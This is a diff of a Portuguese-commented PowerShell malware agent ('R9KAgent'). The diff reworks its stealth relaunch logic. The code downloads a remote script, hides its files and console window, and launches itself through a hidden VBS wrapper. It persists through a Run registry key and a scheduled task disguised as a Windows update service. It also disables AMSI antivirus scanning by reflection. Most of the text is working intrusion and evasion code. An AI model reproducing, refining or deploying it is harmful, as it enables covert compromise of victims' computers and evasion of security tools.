@@ -15,7 +15,7 @@ if (-not $isAdmin) {
     exit
 }
 
-# ===== PREPARA O VBS E PERSISTÊNCIA =====
+# ===== CAMINHOS =====
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
@@ -23,12 +23,13 @@ $vbsPath = "$dir\$installName.vbs"
 New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
-$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
+$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -hidden", 0, False'
 Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
 attrib +h +s +r $scriptPath 2>$null
 attrib +h +s +r $vbsPath 2>$null
 
+# ===== PERSISTÊNCIA =====
 $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
 try {
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -45,21 +46,21 @@ try {
     Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-# ===== VERIFICA SE ESTÁ RODANDO ESCONDIDO =====
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
+# ===== ESCONDE E VAI PRO BACKGROUND =====
+# Se não tiver o argumento -hidden, ele se auto-esconde e passa pro VBS
+if ($args -notcontains "-hidden") {
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    '
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    if ($consolePtr -ne [IntPtr]::Zero) { [Console.Window]::ShowWindow($consolePtr, 0) }
 
-# Se a janela existir (rodou via IEX), ele esconde e passa pro VBS.
-if ($consolePtr -ne [IntPtr]::Zero) {
-    [Console.Window]::ShowWindow($consolePtr, 0) 
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit # Fecha essa janela e a execução continua invisível pelo VBS
 }
 
-# ===== CÓDIGO DO AGENTE (Roda invisível a partir daqui) =====
+# ===== AMSI BYPASS =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -137,7 +138,7 @@ if (-not ("R9KAgent" -as [type])) {
                         File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
                     if (!File.Exists(vbsPath)) {
-                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\"\", 0, False";
+                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -hidden\", 0, False";
                         File.WriteAllText(vbsPath, vbs);
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
